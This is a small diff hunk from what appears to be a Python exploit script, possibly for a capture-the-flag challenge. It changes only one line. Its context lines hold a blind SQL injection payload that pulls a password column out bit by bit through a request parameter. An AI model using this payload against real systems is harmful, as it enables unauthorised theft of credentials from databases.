@@ -38,7 +38,7 @@ def main():
 
     # Unicode len 32 bit
     unicode_len_bit = 32
-    result = ''
+    #result = ''
 
     payload = "'||mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1)=1#"
     param = dict(pw=payload)
